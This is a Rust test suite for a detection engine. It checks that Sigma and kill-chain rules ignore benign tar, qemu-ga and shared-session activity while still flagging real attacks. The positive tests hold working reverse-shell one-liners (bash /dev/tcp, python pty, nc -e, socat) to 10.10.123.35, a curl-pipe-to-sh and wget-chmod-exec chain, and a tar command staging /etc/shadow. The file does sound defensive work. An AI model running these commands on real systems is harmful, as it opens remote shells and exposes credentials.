use super::{seed_kill_chain_templates, seed_sigma_rules};
use detection::{Confidence, DetectionEngine, EventClass, TelemetryEvent};

fn engine() -> DetectionEngine {
    let mut e = DetectionEngine::default_with_rules();
    seed_kill_chain_templates(&mut e);
    seed_sigma_rules(&mut e, std::path::Path::new("rules/sigma"));
    for yaml in [
        include_str!("../../../../rules/sigma/linux_data_staging_archive.yml"),
        include_str!("../../../../rules/sigma/linux_download_exec.yml"),
    ] {
        e.load_sigma_rule_yaml(yaml).unwrap();
    }
    e
}

fn exec(pid: u32, ppid: u32, process: &str, command: &str, ts: i64) -> TelemetryEvent {
    let mut e: TelemetryEvent = serde_json::from_value(serde_json::json!({
        "ts_unix": 100, "event_class": "ProcessExec", "pid": 100, "ppid": 10,
        "uid": 0, "process": "sh", "parent_process": "sh", "session_id": 1,
        "file_write": false, "container_escape": false, "container_privileged": false
    }))
    .unwrap();
    e.pid = pid;
    e.ppid = ppid;
    e.process = process.into();
    e.parent_process = "sh".into();
    e.command_line = Some(command.into());
    e.session_id = 1;
    e.ts_unix = ts;
    e
}

#[test]
fn agentfix27_audit35_negative_fixtures() {
    let rows: Vec<serde_json::Value> =
        serde_json::from_str(include_str!("../../tests/fixtures/agentfix27-audit35.json")).unwrap();
    assert_eq!(rows.len(), 14);
    for row in rows {
        let event: TelemetryEvent = serde_json::from_value(row["event"].clone()).unwrap();
        let mut e = engine();
        if event.event_class == EventClass::NetworkConnect {
            e.process_event(&exec(event.ppid, 2, "sh", "sh", event.ts_unix - 2));
            let mut start = event.clone();
            start.event_class = EventClass::ProcessExec;
            start.ts_unix -= 1;
            e.process_event(&start);
        } else if row["rule_name"] == "phi_download_exec" {
            let mut unrelated = exec(
                55,
                54,
                "curl",
                "curl https://example.test/x",
                event.ts_unix - 1,
            );
            unrelated.session_id = event.session_id;
            e.process_event(&unrelated);
        }
        let o = e.process_event(&event);
        assert!(
            !o.kill_chain_hits
                .iter()
                .chain(o.temporal_hits.iter())
                .any(|h| Some(h.as_str()) == row["rule_name"].as_str()),
            "row {}",
            row["id"]
        );
    }
}

#[test]
fn agentfix27_p2_archive_operations_and_sources() {
    for command in [
        "tar -df alternatives.tar.0 -C /var/lib/dpkg alternatives",
        "tar -df /tmp/x.tar /etc/shadow",
        "tar --diff -f /tmp/x /home",
        "tar --compare -f /tmp/x /etc/shadow",
        "tar -tf /tmp/x.tar /etc/shadow",
        "tar --list -f /tmp/x /home",
        "7z t /tmp/x.7z /etc/shadow",
        "zip -T /tmp/x.zip /etc/shadow",
        "tar -czf /tmp/x /var/lib/dpkg",
    ] {
        let outcome = engine().process_event(&exec(
            100,
            10,
            command.split_whitespace().next().unwrap(),
            command,
            100,
        ));
        assert!(
            !outcome
                .temporal_hits
                .iter()
                .any(|h| h == "linux_data_staging_archive"),
            "{command}"
        );
    }
}

#[test]
fn agentfix27_p3_audit_connections_are_not_reverse_shells() {
    for command in [
        "python3 /usr/sbin/qemu-ga_check.py",
        "python3 -c import subprocess",
        "python3 -c import string",
    ] {
        let mut e = engine();
        e.process_event(&exec(10, 2, "sh", "sh", 100));
        let child = exec(100, 10, "python3", command, 101);
        e.process_event(&child);
        let mut network = child;
        network.event_class = EventClass::NetworkConnect;
        network.ts_unix += 1;
        network.dst_ip = Some("10.10.123.35".into());
        network.dst_port = Some(50053);
        let o = e.process_event(&network);
        assert!(
            !o.kill_chain_hits
                .iter()
                .any(|h| h == "killchain_reverse_shell"),
            "{command}"
        );
    }
}

#[test]
fn agentfix27_p4_shared_session_is_not_lineage() {
    for command in [
        "sh -c touch /var/log/qemu-ga.log",
        "sh -c command -v python >/dev/null",
        "/bin/sh -c python3 /usr/sbin/qemu-ga_check.py",
    ] {
        let mut e = engine();
        e.process_event(&exec(100, 10, "curl", "curl https://example.test/x", 100));
        let o = e.process_event(&exec(200, 20, "sh", command, 101));
        assert!(
            !o.temporal_hits.iter().any(|h| h.contains("download_exec")),
            "{command}: {:?}",
            o.temporal_hits
        );
    }
}

#[test]
fn agentfix27_attack_positives_remain_high() {
    for command in [
        "bash -i >& /dev/tcp/10.10.123.35/50053 0>&1",
        "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.10.123.35\",50053));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
        "nc 10.10.123.35 50053 -e /bin/sh",
        "socat TCP:10.10.123.35:50053 EXEC:/bin/sh",
    ] {
        for port in [443, 50053] {
            let command = command.replace("50053", &port.to_string());
            let mut e = engine();
            e.process_event(&exec(10, 2, "sh", "sh", 100));
            let child = exec(100, 10, command.split_whitespace().next().unwrap(), &command, 101);
            e.process_event(&child);
            let mut network = child;
            network.event_class = EventClass::NetworkConnect;
            network.ts_unix += 1;
            network.dst_ip = Some("10.10.123.35".into());
            network.dst_port = Some(port);
            let o = e.process_event(&network);
            assert!(o.confidence >= Confidence::High, "{command}:{port} {:?}", o);
            assert!(o.kill_chain_hits.iter().any(|h| h == "killchain_reverse_shell"), "{command}:{port}");
            assert!(!o.kill_chain_evidence.is_empty());
        }
    }
    for (download, terminal, process) in [
        ("curl https://example.test/x", "sh", "sh"),
        ("wget -O /tmp/f https://example.test/x", "/tmp/f", "f"),
    ] {
        let mut e = engine();
        e.process_event(&exec(
            100,
            10,
            download.split_whitespace().next().unwrap(),
            download,
            100,
        ));
        if process == "f" {
            e.process_event(&exec(101, 10, "chmod", "chmod +x /tmp/f", 101));
        }
        let mut terminal_event = exec(102, 10, process, terminal, 102);
        terminal_event.file_path = Some(if process == "f" { "/tmp/f" } else { "/bin/sh" }.into());
        let o = e.process_event(&terminal_event);
        assert!(
            o.confidence >= Confidence::High,
            "{download}; {terminal}: {:?}",
            o.temporal_hits
        );
        assert!(o.temporal_hits.iter().any(|h| h == "phi_download_exec"));
    }
    let o = engine().process_event(&exec(
        100,
        10,
        "tar",
        "tar -czf /tmp/x.tgz /home /etc/shadow",
        100,
    ));
    assert!(o.confidence >= Confidence::High);
    assert!(o
        .temporal_hits
        .iter()
        .any(|h| h == "linux_data_staging_archive"));
}
